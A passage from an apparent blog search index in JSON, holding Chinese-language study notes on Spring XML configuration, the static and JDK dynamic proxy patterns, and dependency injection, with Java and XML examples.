/>","title":"alias"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%BD%BF%E7%94%A8XML%E9%85%8D%E7%BD%AE/#bean","text":"id: bean\u7684\u552f\u4e00\u6807\u8bc6\u7b26 class: bean\u5bf9\u8c61\u5bf9\u5e94\u7684\u5b8c\u6574\u7c7b\u540d\uff08\u5305\u540d+\u7c7b\u540d\uff09 name: \u522b\u540d\uff0c\u53ef\u4ee5\u4f7f\u7528\u7a7a\u683c\u6216\u9017\u53f7\u53d6\u591a\u4e2a\u522b\u540d <bean id= \"hello\" class= \"top.longlone.HelloSpring\" name= \"h1,h2\" > <property name= \"str\" value= \"Spring\" /> </bean>","title":"bean"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%BD%BF%E7%94%A8XML%E9%85%8D%E7%BD%AE/#import","text":"\u4e00\u822c\u7528\u4e8e\u56e2\u961f\u5f00\u53d1\u4f7f\u7528\uff0c\u53ef\u4ee5\u5bfc\u5165\u5176\u4ed6\u914d\u7f6e\u6587\u4ef6 <import resource= \"beans.xml\" />","title":"import"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%BD%BF%E7%94%A8XML%E9%85%8D%E7%BD%AE/#\u603b\u7ed3","text":"\u4e86\u89e3\u4e86Spring XML\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u9009\u9879\uff0c\u5206\u522b\u662falias\uff0cbean\uff0cimport\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E7%AE%80%E4%BB%8B/","text":"Spring\u7b80\u4ecb # \u5b98\u7f51 github\u4ed3\u5e93 spring\u4e0b\u8f7d\u5730\u5740 spring\u5b98\u65b9\u6587\u6863 spring\u4e2d\u6587\u6587\u6863 Spring\u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7 IOC(\u63a7\u5236\u53cd\u8f6c )\u548c AOP(\u9762\u5411\u5207\u9762\u7f16\u7a0b) \u7684\u6846\u67b6 \u5b66\u4e60\u8def\u7ebf # Spring->SpringMVC->SpringBoot,SpringCloud \u603b\u7ed3 # Spring\u4e3b\u8981\u7684\u7279\u5f81\u662fIOC\u63a7\u5236\u53cd\u8f6c\u548cAOP\u9762\u5411\u5207\u9762\uff0c\u987a\u4fbf\u8bb0\u5f55\u4e0b\u5b98\u7f51\uff0c\u6587\u6863\u7b49\u3002","title":"Spring\u7b80\u4ecb"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E7%AE%80%E4%BB%8B/#spring\u7b80\u4ecb","text":"\u5b98\u7f51 github\u4ed3\u5e93 spring\u4e0b\u8f7d\u5730\u5740 spring\u5b98\u65b9\u6587\u6863 spring\u4e2d\u6587\u6587\u6863 Spring\u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7 IOC(\u63a7\u5236\u53cd\u8f6c )\u548c AOP(\u9762\u5411\u5207\u9762\u7f16\u7a0b) \u7684\u6846\u67b6","title":"Spring\u7b80\u4ecb"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E7%AE%80%E4%BB%8B/#\u5b66\u4e60\u8def\u7ebf","text":"Spring->SpringMVC->SpringBoot,SpringCloud","title":"\u5b66\u4e60\u8def\u7ebf"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E7%AE%80%E4%BB%8B/#\u603b\u7ed3","text":"Spring\u4e3b\u8981\u7684\u7279\u5f81\u662fIOC\u63a7\u5236\u53cd\u8f6c\u548cAOP\u9762\u5411\u5207\u9762\uff0c\u987a\u4fbf\u8bb0\u5f55\u4e0b\u5b98\u7f51\uff0c\u6587\u6863\u7b49\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/","text":"\u4ee3\u7406\u6a21\u5f0f # \u4e3a\u4ec0\u4e48\u8981\u5b66\u4e60\u4ee3\u7406\u6a21\u5f0f # \u4ee3\u7406\u6a21\u5f0f\u662fSpringAOP\u7684\u5e95\u5c42 \u4ee3\u7406\u6a21\u5f0f\u7684\u5206\u7c7b # \u9759\u6001\u4ee3\u7406 \u52a8\u6001\u4ee3\u7406 \u9759\u6001\u4ee3\u7406 # \u89d2\u8272\u5206\u6790 - \u62bd\u8c61\u63a5\u53e3:\u771f\u5b9e\u7c7b\u548c\u4ee3\u7406\u7c7b\u90fd\u8981\u5b9e\u73b0\u7684\u63a5\u53e3 - \u771f\u5b9e\u7c7b:\u88ab\u4ee3\u7406\u7684\u7c7b - \u4ee3\u7406\u7c7b:\u4ee3\u7406\u771f\u5b9e\u7c7b\uff0c\u4e00\u822c\u4ee3\u7406\u540e\u4f1a\u6709\u4e00\u4e9b\u9644\u5c5e\u64cd\u4f5c - \u5ba2\u6237\u7c7b:\u8bbf\u95ee\u4ee3\u7406\u7c7b \u5b9e\u4f8b\u4ee3\u7801 # package top.longlone ; public interface Rent { public void rent (); } package top.longlone ; public class Landlord implements Rent { public void rent (){ System . out . println ( \"\u79df\u623f\u5b50\" ); } } ```` ``` java package top.longlone ; public class LandlordProxy implements Rent { public Rent landlord ; public LandlordProxy () { this . landlord = new Landlord (); } public void rent () { this . landlord . rent (); System . out . println ( \"\u6536\u4e2d\u4ecb\u8d39\" ); } } ```` ``` java package top.longlone ; public class Client { public static void main ( String [] args ) { Rent landlordProxy = new LandlordProxy (); landlordProxy . rent (); } } \u4ee3\u7406\u6a21\u5f0f\u7684\u7279\u70b9 # \u4f18\u70b9: - \u53ef\u4ee5\u4f7f\u771f\u5b9e\u7c7b\u66f4\u52a0\u7eaf\u7cb9\uff0c\u4e0d\u518d\u9700\u8981\u5173\u6ce8\u4e00\u4e9b\u516c\u5171\u670d\u52a1 - \u5b9e\u73b0\u516c\u5171\u670d\u52a1\u4ea4\u7ed9\u4ee3\u7406\u89d2\u8272\uff0c\u5b9e\u73b0\u4e86\u4e1a\u52a1\u5206\u5de5 - \u5ba2\u6237\u7c7b\u53ea\u80fd\u8bbf\u95ee\u5230\u4ee3\u7406\u7c7b\uff0c\u9690\u85cf\u4e86\u771f\u5b9e\u7c7b - \u65b9\u4fbf\u6269\u5c55\u548c\u96c6\u4e2d\u7ba1\u7406 \u7f3a\u70b9: - \u4ee3\u7406\u7c7b\u548c\u771f\u5b9e\u7c7b\u7684\u5173\u7cfb\u5728\u7f16\u8bd1\u65f6\u786e\u5b9a\uff0c\u6240\u4ee5\u4e00\u4e2a\u771f\u5b9e\u7c7b\u5c31\u9700\u8981\u4e00\u4e2a\u4ee3\u7406\u7c7b \u52a8\u6001\u4ee3\u7406 # \u52a8\u6001\u4ee3\u7406\u5206\u4e3a\u4e24\u7c7b:\u57fa\u4e8e\u63a5\u53e3\u7684\u52a8\u6001\u4ee3\u7406\u548c\u57fa\u4e8e\u7c7b\u7684\u52a8\u6001\u4ee3\u7406 - \u57fa\u4e8e\u63a5\u53e3: JDK\u52a8\u6001\u4ee3\u7406 - \u57fa\u4e8e\u7c7b: cglib - java\u5b57\u8282\u7801\u5b9e\u73b0: javasist \u8fd9\u91cc\u5148\u4e86\u89e3JDK\u81ea\u5e26\u7684\u52a8\u6001\u4ee3\u7406 \u9700\u8981\u4e86\u89e32\u4e2a\u7c7b: - Proxy :\u7528\u4e8e\u521b\u5efa\u4ee3\u7406\u7c7b\u7684\u7c7b - InvocationHandler :\u4ee3\u7406\u5b9e\u4f8b\u8c03\u7528\u65b9\u6cd5\u65f6\u7684\u4e00\u4e2a\u63a5\u53e3\uff0c\u901a\u8fc7\u5728invoke\u65b9\u6cd5\u91cc\u7f16\u5199\u989d\u5916\u4ee3\u7801\u5b9e\u73b0\u9644\u5c5e\u529f\u80fd \u5b9e\u4f8b\u4ee3\u7801 # package top.longlone ; // \u62bd\u8c61\u63a5\u53e3\uff0c\u62bd\u8c61\u51farent\u8fd9\u4e2a\u65b9\u6cd5 public interface Rent { public void rent (); } package top.longlone ; // \u771f\u5b9e\u7c7b\uff0c\u5b9e\u73b0\u4e86rent\u65b9\u6cd5 public class Landlord implements Rent { public void rent (){ System . out . println ( \"\u79df\u623f\u5b50\" ); } } package top.longlone ; import java.lang.reflect.InvocationHandler ; import java.lang.reflect.Method ; import java.lang.reflect.Proxy ; // \u8fd9\u91cc\u5c06Porxy\u548cInvocationHandler\u5408\u4e8c\u4e3a\u4e00 public class LandlordInvocationHandler implements InvocationHandler { //\u771f\u5b9e\u7c7b\u7684\u5b9e\u4f8b\uff0c\u5373\u88ab\u4ee3\u7406\u7684\u5b9e\u4f8b private Object obj ; public Object getObj () { return obj ; } public void setObj ( Object obj ) { this . obj = obj ; } public LandlordInvocationHandler () { } public LandlordInvocationHandler ( Object obj ) { this . obj = obj ; } // \u83b7\u53d6\u4ee3\u7406\u7c7b public Rent getProxy () { return ( Rent ) Proxy . newProxyInstance ( obj . getClass (). getClassLoader (), obj . getClass (). getInterfaces (), this ); } // \u91cd\u5199InvocationHandler\u7684invoke\u65b9\u6cd5\uff0c\u5728\u8c03\u7528Rent\u63a5\u53e3\u7684\u4efb\u4f55\u65b9\u6cd5\u524d\u524d\u589e\u52a0\u4e00\u53e5\u8f93\u51fa @Override public Object invoke ( Object proxy , Method method , Object [] args ) throws Throwable { System . out . println ( \"Running method: \" + method . getName ()); Object result = method . invoke ( obj , args ); return result ; } } package top.longlone ; public class Client { public static void main ( String [] args ) { // \u521b\u5efa\u771f\u5b9e\u7c7b\u7684\u5b9e\u4f8b\uff0c\u5373\u88ab\u4ee3\u7406\u7684\u5b9e\u4f8b Landlord landlord = new Landlord (); // \u521b\u5efa\u81ea\u5df1\u7f16\u5199\u7684InvocationHandler\uff0c\u5e76\u4f20\u5165\u88ab\u4ee3\u7406\u7684\u5b9e\u4f8b LandlordInvocationHandler handler = new LandlordInvocationHandler ( landlord ); // \u83b7\u53d6\u4ee3\u7406\u7c7b Rent landlordProxy = handler . getProxy (); // \u8c03\u7528\u4ee3\u7406\u7c7b\u7684rent\u65b9\u6cd5 landlordProxy . rent (); /* Output: Running method: rent \u79df\u623f\u5b50 */ } } \u4ee3\u7406\u6a21\u5f0f\u548c\u88c5\u9970\u5668\u6a21\u5f0f\u7684\u533a\u522b # \u88c5\u9970\u5668\u6a21\u5f0f\u5173\u6ce8\u4e8e\u5728\u4e00\u4e2a\u5bf9\u8c61\u4e0a\u52a8\u6001\u7684\u6dfb\u52a0\u65b9\u6cd5\uff0c\u7136\u800c\u4ee3\u7406\u6a21\u5f0f\u5173\u6ce8\u4e8e\u63a7\u5236\u5bf9\u5bf9\u8c61\u7684\u8bbf\u95ee\u3002\u6362\u53e5\u8bdd \u8bf4\uff0c\u7528\u4ee3\u7406\u6a21\u5f0f\uff0c\u4ee3\u7406\u7c7b\u53ef\u4ee5\u5bf9\u5b83\u7684\u5ba2\u6237\u9690\u85cf\u4e00\u4e2a\u5bf9\u8c61\u7684\u5177\u4f53\u4fe1\u606f\u3002\u56e0\u6b64\uff0c\u5f53\u4f7f\u7528\u4ee3\u7406\u6a21\u5f0f\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5e38\u5e38\u5728\u4e00\u4e2a\u4ee3\u7406\u7c7b\u4e2d\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002\u5e76\u4e14\uff0c\u5f53\u6211\u4eec\u4f7f\u7528\u88c5\u9970\u5668\u6a21 \u5f0f\u7684\u65f6\u5019\uff0c\u6211\u4eec\u901a\u5e38\u7684\u505a\u6cd5\u662f\u5c06\u539f\u59cb\u5bf9\u8c61\u4f5c\u4e3a\u4e00\u4e2a\u53c2\u6570\u4f20\u7ed9\u88c5\u9970\u8005\u7684\u6784\u9020\u5668\u3002 \u4f7f\u7528\u4ee3\u7406\u6a21\u5f0f\uff0c\u4ee3\u7406\u548c\u771f\u5b9e\u5bf9\u8c61\u4e4b\u95f4\u7684\u7684\u5173\u7cfb\u901a\u5e38\u5728\u7f16\u8bd1\u65f6\u5c31\u5df2\u7ecf\u786e\u5b9a\u4e86\uff0c\u800c\u88c5\u9970\u8005\u80fd\u591f\u5728\u8fd0\u884c\u65f6\u9012\u5f52\u5730\u88ab\u6784\u9020\u3002 \u603b\u7ed3 # \u4ee3\u7406\u6a21\u5f0f\u662fSpringAOP\u7684\u5e95\u5c42\uff0c\u5206\u4e3a\u9759\u6001\u4ee3\u7406\u548c\u52a8\u6001\u4ee3\u7406\uff0c\u540c\u65f6\u4e86\u89e3\u4e86JDK\u81ea\u5e26\u7684\u52a8\u6001\u4ee3\u7406\u7684\u7f16\u5199\u3002","title":"\u4ee3\u7406\u6a21\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u4ee3\u7406\u6a21\u5f0f","text":"","title":"\u4ee3\u7406\u6a21\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u4e3a\u4ec0\u4e48\u8981\u5b66\u4e60\u4ee3\u7406\u6a21\u5f0f","text":"\u4ee3\u7406\u6a21\u5f0f\u662fSpringAOP\u7684\u5e95\u5c42","title":"\u4e3a\u4ec0\u4e48\u8981\u5b66\u4e60\u4ee3\u7406\u6a21\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u4ee3\u7406\u6a21\u5f0f\u7684\u5206\u7c7b","text":"\u9759\u6001\u4ee3\u7406 \u52a8\u6001\u4ee3\u7406","title":"\u4ee3\u7406\u6a21\u5f0f\u7684\u5206\u7c7b"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u9759\u6001\u4ee3\u7406","text":"\u89d2\u8272\u5206\u6790 - \u62bd\u8c61\u63a5\u53e3:\u771f\u5b9e\u7c7b\u548c\u4ee3\u7406\u7c7b\u90fd\u8981\u5b9e\u73b0\u7684\u63a5\u53e3 - \u771f\u5b9e\u7c7b:\u88ab\u4ee3\u7406\u7684\u7c7b - \u4ee3\u7406\u7c7b:\u4ee3\u7406\u771f\u5b9e\u7c7b\uff0c\u4e00\u822c\u4ee3\u7406\u540e\u4f1a\u6709\u4e00\u4e9b\u9644\u5c5e\u64cd\u4f5c - \u5ba2\u6237\u7c7b:\u8bbf\u95ee\u4ee3\u7406\u7c7b","title":"\u9759\u6001\u4ee3\u7406"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u5b9e\u4f8b\u4ee3\u7801","text":"package top.longlone ; public interface Rent { public void rent (); } package top.longlone ; public class Landlord implements Rent { public void rent (){ System . out . println ( \"\u79df\u623f\u5b50\" ); } } ```` ``` java package top.longlone ; public class LandlordProxy implements Rent { public Rent landlord ; public LandlordProxy () { this . landlord = new Landlord (); } public void rent () { this . landlord . rent (); System . out . println ( \"\u6536\u4e2d\u4ecb\u8d39\" ); } } ```` ``` java package top.longlone ; public class Client { public static void main ( String [] args ) { Rent landlordProxy = new LandlordProxy (); landlordProxy . rent (); } }","title":"\u5b9e\u4f8b\u4ee3\u7801"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u4ee3\u7406\u6a21\u5f0f\u7684\u7279\u70b9","text":"\u4f18\u70b9: - \u53ef\u4ee5\u4f7f\u771f\u5b9e\u7c7b\u66f4\u52a0\u7eaf\u7cb9\uff0c\u4e0d\u518d\u9700\u8981\u5173\u6ce8\u4e00\u4e9b\u516c\u5171\u670d\u52a1 - \u5b9e\u73b0\u516c\u5171\u670d\u52a1\u4ea4\u7ed9\u4ee3\u7406\u89d2\u8272\uff0c\u5b9e\u73b0\u4e86\u4e1a\u52a1\u5206\u5de5 - \u5ba2\u6237\u7c7b\u53ea\u80fd\u8bbf\u95ee\u5230\u4ee3\u7406\u7c7b\uff0c\u9690\u85cf\u4e86\u771f\u5b9e\u7c7b - \u65b9\u4fbf\u6269\u5c55\u548c\u96c6\u4e2d\u7ba1\u7406 \u7f3a\u70b9: - \u4ee3\u7406\u7c7b\u548c\u771f\u5b9e\u7c7b\u7684\u5173\u7cfb\u5728\u7f16\u8bd1\u65f6\u786e\u5b9a\uff0c\u6240\u4ee5\u4e00\u4e2a\u771f\u5b9e\u7c7b\u5c31\u9700\u8981\u4e00\u4e2a\u4ee3\u7406\u7c7b","title":"\u4ee3\u7406\u6a21\u5f0f\u7684\u7279\u70b9"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u52a8\u6001\u4ee3\u7406","text":"\u52a8\u6001\u4ee3\u7406\u5206\u4e3a\u4e24\u7c7b:\u57fa\u4e8e\u63a5\u53e3\u7684\u52a8\u6001\u4ee3\u7406\u548c\u57fa\u4e8e\u7c7b\u7684\u52a8\u6001\u4ee3\u7406 - \u57fa\u4e8e\u63a5\u53e3: JDK\u52a8\u6001\u4ee3\u7406 - \u57fa\u4e8e\u7c7b: cglib - java\u5b57\u8282\u7801\u5b9e\u73b0: javasist \u8fd9\u91cc\u5148\u4e86\u89e3JDK\u81ea\u5e26\u7684\u52a8\u6001\u4ee3\u7406 \u9700\u8981\u4e86\u89e32\u4e2a\u7c7b: - Proxy :\u7528\u4e8e\u521b\u5efa\u4ee3\u7406\u7c7b\u7684\u7c7b - InvocationHandler :\u4ee3\u7406\u5b9e\u4f8b\u8c03\u7528\u65b9\u6cd5\u65f6\u7684\u4e00\u4e2a\u63a5\u53e3\uff0c\u901a\u8fc7\u5728invoke\u65b9\u6cd5\u91cc\u7f16\u5199\u989d\u5916\u4ee3\u7801\u5b9e\u73b0\u9644\u5c5e\u529f\u80fd","title":"\u52a8\u6001\u4ee3\u7406"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u5b9e\u4f8b\u4ee3\u7801_1","text":"package top.longlone ; // \u62bd\u8c61\u63a5\u53e3\uff0c\u62bd\u8c61\u51farent\u8fd9\u4e2a\u65b9\u6cd5 public interface Rent { public void rent (); } package top.longlone ; // \u771f\u5b9e\u7c7b\uff0c\u5b9e\u73b0\u4e86rent\u65b9\u6cd5 public class Landlord implements Rent { public void rent (){ System . out . println ( \"\u79df\u623f\u5b50\" ); } } package top.longlone ; import java.lang.reflect.InvocationHandler ; import java.lang.reflect.Method ; import java.lang.reflect.Proxy ; // \u8fd9\u91cc\u5c06Porxy\u548cInvocationHandler\u5408\u4e8c\u4e3a\u4e00 public class LandlordInvocationHandler implements InvocationHandler { //\u771f\u5b9e\u7c7b\u7684\u5b9e\u4f8b\uff0c\u5373\u88ab\u4ee3\u7406\u7684\u5b9e\u4f8b private Object obj ; public Object getObj () { return obj ; } public void setObj ( Object obj ) { this . obj = obj ; } public LandlordInvocationHandler () { } public LandlordInvocationHandler ( Object obj ) { this . obj = obj ; } // \u83b7\u53d6\u4ee3\u7406\u7c7b public Rent getProxy () { return ( Rent ) Proxy . newProxyInstance ( obj . getClass (). getClassLoader (), obj . getClass (). getInterfaces (), this ); } // \u91cd\u5199InvocationHandler\u7684invoke\u65b9\u6cd5\uff0c\u5728\u8c03\u7528Rent\u63a5\u53e3\u7684\u4efb\u4f55\u65b9\u6cd5\u524d\u524d\u589e\u52a0\u4e00\u53e5\u8f93\u51fa @Override public Object invoke ( Object proxy , Method method , Object [] args ) throws Throwable { System . out . println ( \"Running method: \" + method . getName ()); Object result = method . invoke ( obj , args ); return result ; } } package top.longlone ; public class Client { public static void main ( String [] args ) { // \u521b\u5efa\u771f\u5b9e\u7c7b\u7684\u5b9e\u4f8b\uff0c\u5373\u88ab\u4ee3\u7406\u7684\u5b9e\u4f8b Landlord landlord = new Landlord (); // \u521b\u5efa\u81ea\u5df1\u7f16\u5199\u7684InvocationHandler\uff0c\u5e76\u4f20\u5165\u88ab\u4ee3\u7406\u7684\u5b9e\u4f8b LandlordInvocationHandler handler = new LandlordInvocationHandler ( landlord ); // \u83b7\u53d6\u4ee3\u7406\u7c7b Rent landlordProxy = handler . getProxy (); // \u8c03\u7528\u4ee3\u7406\u7c7b\u7684rent\u65b9\u6cd5 landlordProxy . rent (); /* Output: Running method: rent \u79df\u623f\u5b50 */ } }","title":"\u5b9e\u4f8b\u4ee3\u7801"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u4ee3\u7406\u6a21\u5f0f\u548c\u88c5\u9970\u5668\u6a21\u5f0f\u7684\u533a\u522b","text":"\u88c5\u9970\u5668\u6a21\u5f0f\u5173\u6ce8\u4e8e\u5728\u4e00\u4e2a\u5bf9\u8c61\u4e0a\u52a8\u6001\u7684\u6dfb\u52a0\u65b9\u6cd5\uff0c\u7136\u800c\u4ee3\u7406\u6a21\u5f0f\u5173\u6ce8\u4e8e\u63a7\u5236\u5bf9\u5bf9\u8c61\u7684\u8bbf\u95ee\u3002\u6362\u53e5\u8bdd \u8bf4\uff0c\u7528\u4ee3\u7406\u6a21\u5f0f\uff0c\u4ee3\u7406\u7c7b\u53ef\u4ee5\u5bf9\u5b83\u7684\u5ba2\u6237\u9690\u85cf\u4e00\u4e2a\u5bf9\u8c61\u7684\u5177\u4f53\u4fe1\u606f\u3002\u56e0\u6b64\uff0c\u5f53\u4f7f\u7528\u4ee3\u7406\u6a21\u5f0f\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5e38\u5e38\u5728\u4e00\u4e2a\u4ee3\u7406\u7c7b\u4e2d\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002\u5e76\u4e14\uff0c\u5f53\u6211\u4eec\u4f7f\u7528\u88c5\u9970\u5668\u6a21 \u5f0f\u7684\u65f6\u5019\uff0c\u6211\u4eec\u901a\u5e38\u7684\u505a\u6cd5\u662f\u5c06\u539f\u59cb\u5bf9\u8c61\u4f5c\u4e3a\u4e00\u4e2a\u53c2\u6570\u4f20\u7ed9\u88c5\u9970\u8005\u7684\u6784\u9020\u5668\u3002 \u4f7f\u7528\u4ee3\u7406\u6a21\u5f0f\uff0c\u4ee3\u7406\u548c\u771f\u5b9e\u5bf9\u8c61\u4e4b\u95f4\u7684\u7684\u5173\u7cfb\u901a\u5e38\u5728\u7f16\u8bd1\u65f6\u5c31\u5df2\u7ecf\u786e\u5b9a\u4e86\uff0c\u800c\u88c5\u9970\u8005\u80fd\u591f\u5728\u8fd0\u884c\u65f6\u9012\u5f52\u5730\u88ab\u6784\u9020\u3002","title":"\u4ee3\u7406\u6a21\u5f0f\u548c\u88c5\u9970\u5668\u6a21\u5f0f\u7684\u533a\u522b"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#\u603b\u7ed3","text":"\u4ee3\u7406\u6a21\u5f0f\u662fSpringAOP\u7684\u5e95\u5c42\uff0c\u5206\u4e3a\u9759\u6001\u4ee3\u7406\u548c\u52a8\u6001\u4ee3\u7406\uff0c\u540c\u65f6\u4e86\u89e3\u4e86JDK\u81ea\u5e26\u7684\u52a8\u6001\u4ee3\u7406\u7684\u7f16\u5199\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/","text":"\u4f9d\u8d56\u6ce8\u5165(DI) # \u6784\u9020\u5668\u6ce8\u5165 # \u53c2\u8003 HelloSpring Set\u65b9\u5f0f\u6ce8\u5165 # \u4f9d\u8d56\u6ce8\u5165 \u4f9d\u8d56: bean\u5bf9\u8c61\u7684\u521b\u5efa\u4f9d\u8d56\u4e8e\u5bb9\u5668 \u6ce8\u5165: bean\u5bf9\u8c61\u4e2d\u7684\u6240\u6709\u5c5e\u6027\u7531\u5bb9\u5668\u6765\u6ce8\u5165 \u6ce8\u5165\u590d\u6742\u7684\u503c # public class Address { private String address ; // \u7701\u7565getter setter toStirng\u65b9\u6cd5 } public class Student { private Address address ; private String name ; private String [] books ; private List < String > hobbies ; private Map < String , String > card ; private Set < String > games ; private String friend ; private Properties info ; // \u7701\u7565getter setter toStirng\u65b9\u6cd5 } <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\" > <bean id= \"address\" class= \"top.longlone.Address\" > <property name= \"address\" value= \"https://longlone.top\" /> </bean> <bean id= \"student\" class= \"top.longlone.Student\" > <!--\u666e\u901a\u6ce8\u5165--> <property name= \"name\" value= \"longlone\" /> <!--bean\u6ce8\u5165--> <property name= \"address\" ref= \"address\" /> <!--\u6570\u7ec4\u6ce8\u5165--> <property name= \"books\" > <array> <value> \u8bed\u6587 </value> <value> \u6570\u5b66 </value> <value> \u82f1\u8bed </value> </array> </property> <!--List\u6ce8\u5165--> <property name= \"hobbies\" > <list> <value> \u542c\u6b4c </value> <value> \u6572\u4ee3\u7801 </value> <value> \u5e72\u996d </value> </list> </property> <!--Map\u6ce8\u5165--> <property name= \"card\" > <map> <entry key= \"Boy\" value= \"bbb\" /> <entry key= \"Girl\" value= \"ggg\" /> </map> </property> <!--Set\u6ce8\u5165--> <property name= \"games\" > <set> <value> LOL </value> <value> CF </value> <value> DOTA </value> </set> </property> <!--null\u6ce8\u5165--> <property name= \"friend\" > <null/> </property> <!--Properties\u6ce8\u5165--> <property name= \"info\" > <props> <prop key= \"idcard\" > 2020111111 </prop> <prop key= \"sex\" > 1 </prop> <prop key= \"blog\" > https://longlone.top/ </prop> </props> </property> </bean> </beans> \u6269\u5c55\u6ce8\u5165 # \u5047\u8bbe\u6211\u4eec\u6709\u4e00\u4e2aBean\u5982\u4e0b package top.longlone ; public class User { private String name ; private int age ; // \u7701\u7565getter setter toStirng Constructor\u65b9\u6cd5 } p\u547d\u540d\u7a7a\u95f4\u6ce8\u5165 # p\u5bf9\u5e94\u7684\u662fproperty\uff0c\u5176\u5b9e\u662fSet\u6ce8\u5165\u7684\u4e00\u4e2a\u7b80\u5316\u6a21\u5f0f \u9700\u8981\u5728beans\u91cc\u52a0\u5165\u4e00\u4e2a\u6269\u5c55 xmlns:p=\"http://www.springframework.org/schema/p\" \uff0c\u901a\u8fc7\u8fd9\u4e2a\u6269\u5c55\u53ef\u4ee5\u76f4\u63a5\u5728bean\u91cc\u6ce8\u5165\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u800c\u4e0d\u9700\u8981property\u6807\u7b7e <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:p= \"http://www.springframework.org/schema/p\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\" > <bean id= \"user\" class= \"top.longlone.User\" p:age= \"18\" p:name= \"whoami\" /> </beans> c\u547d\u540d\u7a7a\u95f4\u6ce8\u5165 # c\u5bf9\u5e94\u7684\u662fconstructor\uff0c\u5176\u5b9e\u662f\u6784\u9020\u5668\u6ce8\u5165\u7684\u4e00\u4e2a\u7b80\u5316\u6a21\u5f0f \u9700\u8981\u5728beans\u91cc\u52a0\u5165\u4e00\u4e2a\u6269\u5c55 xmlns:c=\"http://www.springframework.org/schema/c\" \uff0c\u901a\u8fc7\u8fd9\u4e2a\u6269\u5c55\u53ef\u4ee5\u76f4\u63a5\u5728bean\u91cc\u8c03\u7528\u6784\u9020\u5668\u76f4\u63a5\u6ce8\u5165\u7c7b\u7684\u5c5e\u6027\uff0c\u800c\u4e0d\u9700\u8981constructor-arg\u6807\u7b7e <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:c= \"http://www.springframework.org/schema/c\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\" > <bean id= \"user\" class= \"top.longlone.User\" c:age= \"18\" c:name= \"whoami\" /> </beans> \u603b\u7ed3 # \u4f9d\u8d56\u6ce8\u5165(DI)\u662f\u4e00\u79cd\u5b9e\u73b0\u63a7\u5236\u53cd\u8f6c\u7684\u65b9\u5f0f\uff0c\u5728\u5bf9\u8c61\u521b\u5efa\u65f6\uff0c\u901a\u8fc7\u4f7f\u7528\u8005\u5c06\u6240\u9700\u4f9d\u8d56\u6ce8\u5165\u5230\u5bf9\u8c61\u91cc\u3002 Spring\u4e2d\u7684\u4f9d\u8d56\u6ce8\u5165\u65b9\u5f0f\u6709\u4e09\u79cd\uff0c\u5206\u522b\u4e3a\u6784\u9020\u5668\u6ce8\u5165\uff0cSet\u65b9\u5f0f\u6ce8\u5165\u548c\u6269\u5c55\u6ce8\u5165\u3002","title":"\u4f9d\u8d56\u6ce8\u5165(DI)"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/#\u4f9d\u8d56\u6ce8\u5165di","text":"","title":"\u4f9d\u8d56\u6ce8\u5165(DI)"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/#\u6784\u9020\u5668\u6ce8\u5165","text":"\u53c2\u8003 